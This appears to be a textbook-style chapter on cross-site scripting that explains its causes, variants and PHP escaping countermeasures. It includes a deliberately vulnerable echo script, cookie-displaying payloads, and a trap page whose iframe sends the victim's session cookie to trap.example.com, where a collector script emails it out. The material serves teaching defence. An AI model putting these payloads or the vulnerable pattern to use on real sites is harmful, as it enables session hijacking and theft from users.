# Chapter 4.3 - XSS (Cross-Site Scripting)

## 4.3.1 Cross-Site Scripting (Basics)

### Overview

Display-related security issues include:
- Cross-Site Scripting (XSS)
- Error messages leaking information

When an application dynamically generates HTML using external input (URL, JavaScript, CSS), and fails to handle it properly, XSS vulnerabilities arise.

### XSS Vulnerability Summary

| Aspect | Description |
|--------|-------------|
| **Where it occurs** | Pages that output HTML/JavaScript built from external input |
| **What is affected** | Pages that receive the output (may affect the entire application) |
| **Type of threat** | Execution of JavaScript or display of fake content on the user's browser |
| **Severity** | Medium to High |
| **Root cause** | Failure to properly escape special characters (metacharacters) in HTML |
| **Countermeasure** | Escape `<` and `&` in element content; escape `"`, `<`, `&` inside attribute values using double quotes |

### Attack Methods and Impact

Three main categories of XSS abuse:

1. **Cookie value theft (session hijacking)**
2. **Other JavaScript-based attacks**
3. **Page content replacement (defacement / phishing)**

---

### XSS Cookie Theft Attack

**Vulnerable script example** (`43/43-001.php`):
```php
<?php
  session_start();
  // login check omitted
?>
<body>
Search keyword: <?php echo $_GET['keyword']; ?><br>
... (results)
</body>
```

**Normal usage:**
```
http://example.jp/43/43-001.php?keyword=Haskell
```

**Attack payload (injected keyword):**
```
keyword=<script>alert(document.cookie)</script>
```

This displays the session ID (`PHPSESSID`) stored in the cookie.

### Passive Attack: Stealing Another User's Cookie

**Trap site HTML** (`http://trap.example.com/43/43-900.html`):
```html
<html><body>
Bargain information
<br><br>
<iframe width=320 height=100 src='http://example.jp/43/43-001.php?keyword=<script>window.location="http://trap.example.com/43/43-901.php?sid="%2Bdocument.cookie;</script>'></iframe>
</body></html>
```

**Attack flow:**
1. The trap site loads the vulnerable site in an `<iframe>`
2. The vulnerable site is hit with XSS, and cookie values are sent to a data collection page via query string
3. The data collection page emails the stolen cookie to the attacker

**Data collection script** (`43/43-901.php`):
```php
<?php
  mb_language('Japanese');
  $sid = $_GET['sid'];
  mb_send_mail('wasbook@example.jp', 'Success', 'SessionID: ', $sid,
    'From: cracked@trap.example.com');
?>
<body>No results found<br>
<?php echo $sid; ?>
</body>
```

**Result:** Attacker receives the victim's session ID by email, enabling session hijacking.

---

### Other JavaScript-Based Attacks

| Year | Worm Name | Target Site | Attack Details |
|------|-----------|-------------|----------------|
| 2005/10 | JS/Spacehero (Samy) | myspace.com | First worm to spread via XSS on SNS |
| 2006/06 | JS.Yamanner@m | Yahoo! Mail (mobile) | Stole address book addresses for spam |
| 2010/09 | JS.Twettir | twitter.com | Copied profile info, sent spam DMs |
| 2010/09 | - | twitter.com | Rogue tweets, redirects to porn sites |

---

### Screen Replacement (Defacement) Attack

Even sites without login functionality are vulnerable to XSS for **page defacement and phishing**.

**Technique:**
- `</form>` closes the original form element on the target site
- A new overlaid form is injected using `style` with `position:absolute; z-index:99`
- Background is set to white so the original form is hidden underneath
- The `action` URL points to the attacker's server

---

## Reflected XSS vs. Stored XSS

### Reflected XSS
- The attack JavaScript is placed on a **different site** (or in a URL/email link)
- The vulnerable site **reflects** the script back to the user's browser
- Common pattern: input forms and search results pages that echo user input

### Stored (Persistent) XSS
- The attack JavaScript is **saved in the target site's database**
- Typical targets: Web mail, SNS, and similar user-generated content platforms
- More dangerous because no user action (clicking a link) is needed beyond normal site usage

### DOM-Based XSS
- Occurs when JavaScript on the page directly manipulates parameters without going through the server
- Discussed in section 4.17

---

## Root Cause of XSS Vulnerabilities

- HTML uses special metacharacters (`<`, `&`, `"`, `'`) for syntax
- When developers fail to distinguish between literal text and HTML markup
- The process of converting metacharacters to safe representations is called **escaping**

---

## Escaping Rules by Context

| Context | Description | Escape Method |
|---------|-------------|---------------|
| **Element content** | Text between tags | Escape `<` and `&` with character references |
| **Attribute value** | Values in quotes | Escape `"`, `<`, `&`; wrap in double quotes |
| **Attribute URL** | `href`, `src` attributes | Check URL scheme; also apply attribute value escaping |
| **Event handler** | `onclick`, `onload`, etc. | JavaScript escaping, then HTML escaping |
| **script element body** | Inline `<script>` code | JavaScript string literal escaping |

---

## Using `htmlspecialchars` in PHP

**Quote style constants and characters escaped:**

| Character | Replacement | ENT_NOQUOTES | ENT_COMPAT | ENT_QUOTES |
|-----------|-------------|:---:|:---:|:---:|
| `<` | `&lt;` | x | x | x |
| `>` | `&gt;` | x | x | x |
| `&` | `&amp;` | x | x | x |
| `"` | `&quot;` | - | x | x |
| `'` | `&#39;` | - | - | x |

**Best practice:**
```php
echo htmlspecialchars($p, ENT_QUOTES, 'UTF-8');
```

---

## Insurance-Level (Defense-in-Depth) Countermeasures

| Countermeasure | Purpose |
|----------------|---------|
| `X-XSS-Protection: 1; mode=block` | Enable browser XSS filter |
| Input validation | Reduce attack surface |
| `HttpOnly` cookie flag | Prevent JS cookie theft |
| Disable TRACE method | Prevent Cross-Site Tracing |
| `Content-Type: charset=UTF-8` | Prevent encoding-based bypasses |

---

## 4.3.2 Cross-Site Scripting (Advanced)

### href/src Attribute XSS (javascript: scheme)

**Vulnerable code:**
```php
<a href="<?php echo htmlspecialchars($_GET['url']); ?>">Bookmark</a>
```

**Attack:** `url=javascript:alert(document.cookie)` — `htmlspecialchars` does NOT prevent this.

**Countermeasure:** Validate URL scheme — allow only `http:`, `https:`, or `/` (relative paths).

---

### Event Handler XSS

Even with `htmlspecialchars`, event handlers are vulnerable because HTML entity decoding occurs before JavaScript execution.

**Correct approach:**
1. First escape as **JavaScript string literal** (`'` → `\'`, `"` → `\"`, `\` → `\\`)
2. Then apply **HTML escaping**

---

### Script Element XSS

`</script>` in user input terminates the script block regardless of JS-level escaping.

**Recommended approaches:**
- Use **HTML5 custom data attributes** (`data-*`) instead of inline JS
- Use `json_encode` with `JSON_HEX_TAG | JSON_HEX_AMP`

**Custom data attribute example:**
```php
<div id="name" data-name="<?php echo htmlspecialchars($_GET['name'], ENT_COMPAT, 'utf-8'); ?>"></div>
<script>
    var txt = document.getElementById('name').dataset.name;
</script>
```

---

### Allowing User HTML (User-Generated Content)

- Use a whitelist approach for allowed elements/attributes
- Use a sanitization library (e.g., **HTML Purifier** for PHP)
- Never build a custom sanitizer — HTML syntax is too complex

---

## 4.3.3 Information Leakage from Error Messages

- Error messages can leak internal details (function names, table names)
- **PHP setting:** `display_errors = off` in production

---

## Key Takeaways

1. **XSS is caused by failure to escape HTML metacharacters** in output
2. **Always escape output** using `htmlspecialchars` with `ENT_QUOTES` and correct charset
3. **Different contexts require different escaping** — element content, attributes, URLs, event handlers, script blocks
4. **Reflected XSS** echoes input back; **Stored XSS** persists in the database (more dangerous)
5. **`javascript:` scheme** bypasses HTML escaping — validate URL schemes separately
6. **Event handlers** need JS escaping first, then HTML escaping
7. **`<script>` blocks** — prefer custom data attributes or `json_encode`
8. **Defense in depth:** HttpOnly cookies, X-XSS-Protection, Content-Type charset, input validation, disable TRACE
9. **User-generated HTML** — use HTML Purifier or equivalent sanitization library
10. **Suppress error messages** in production
